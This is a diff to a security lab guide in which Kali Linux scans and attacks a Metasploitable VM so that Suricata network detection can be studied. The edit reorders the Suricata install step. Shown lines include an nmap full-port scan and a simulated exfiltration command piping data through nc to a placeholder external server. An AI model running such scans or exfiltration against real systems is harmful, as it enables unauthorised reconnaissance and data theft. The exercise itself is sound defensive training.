@@ -70,12 +70,16 @@ GPG (GNU Privacy Guard) keys are used to digitally sign packages in a Linux dist
 
 Objective: Generate network traffic and identify open ports and services on the Metasploitable VM.
 
-1. Ping Metasploitable from Kali: Open a terminal in Kali Linux and run:
+1. Install and Run an Open-Source NDR Tool: Install Suricata:
+   ```
+  sudo apt install suricata
+  ```
+2. Ping Metasploitable from Kali: Open a terminal in Kali Linux and run:
   ```
   ping <Metasploitable_IP>
   ```
 
-This sends ICMP echo requests to the Metasploitable VM, generating network traffic that can be monitored by NDR solutions.
+  This sends ICMP echo requests to the Metasploitable VM, generating network traffic that can be monitored by NDR solutions.
 
 2. Open a terminal in Kali Linux. Run Nmap to scan the Metasploitable VM:
    ```
@@ -83,7 +87,7 @@ This sends ICMP echo requests to the Metasploitable VM, generating network traff
    ```
 3. Analyze the output: Look for open ports, the state of each port (open/closed/filtered), and the service/version information.
 
-Running nmap -sS -sV -p- <Metasploitable_IP> provides crucial information about the network services available on the target. This reconnaissance step is vital for ethical hackers and attackers alike, and understanding the implications of the scan output is essential for effective security assessments and incident response strategies.
+   Running nmap -sS -sV -p- <Metasploitable_IP> provides crucial information about the network services available on the target. This reconnaissance step is vital for ethical hackers and attackers alike, and understanding the implications of the scan output is essential for effective security assessments and incident response strategies.
 
 **Activity 2: Exploitation**
 
@@ -135,12 +139,7 @@ echo "Sensitive Data" | nc <your_external_server_IP> <port>
 
 Objective: Simulate monitoring and analyze alerts related to the activities performed.
 
-1. Install and Run an Open-Source NDR Tool: Install Suricata:
-```
-sudo apt update
-sudo apt install suricata
-```
-2. Start Suricata: Check the status of Suricata to ensure it's running:
+1. Start Suricata: Check the status of Suricata to ensure it's running:
 ```
 sudo systemctl status suricata
 ```
